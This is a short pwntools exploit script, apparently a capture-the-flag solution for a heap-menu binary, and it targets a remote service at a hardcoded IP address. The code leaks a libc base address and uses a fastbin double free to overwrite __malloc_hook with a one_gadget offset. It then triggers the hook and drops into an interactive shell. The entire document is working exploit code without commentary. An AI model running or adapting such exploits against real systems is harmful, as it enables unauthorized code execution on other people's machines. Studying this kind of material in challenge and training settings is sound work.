from pwn import *
def cmd(c):
	p.sendlineafter("choice : ",str(c))
def add(size,name,kind="A"):
	cmd(1)
	p.sendlineafter("name :",str(size))
	p.sendafter("animal :",name)
	p.sendlineafter("animal :",kind)
def show():
	cmd(2)
def free(idx):
	cmd(3)
	p.sendlineafter("cage:",str(idx))
def clear_all():
	cmd(4)
p=process("./pwn")
p=remote("43.254.3.203",10006)
#context.log_level='debug'
add(0x1000000090,"A\n")#0
add(0x18,"\n")#1
free(0)
add(0x18,"\n")#2
show()
p.readuntil("[2] :\n")
base=(u64((p.readline()[:-1]+"\x00").ljust(8,'\x00'))<<8)-(0x7fa2234a1b00-0x00007fa2230dd000)
log.warning(hex(base))
#gdb.attach(p)
add(0x60,"\n")#3
add(0x60,'\n')#4

free(3)
free(4)
free(3)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address=base
add(0x60,p64(libc.symbols['__malloc_hook']-35))#3
add(0x60,"\n")#4
add(0x60,"\n")#5
one=0xf02a4+base
add(0x60,'\x00'*19+p64(one))
free(4)
free(4)
#gdb.attach(p)
p.interactive()

#x/8gx 0x0000000006020E0
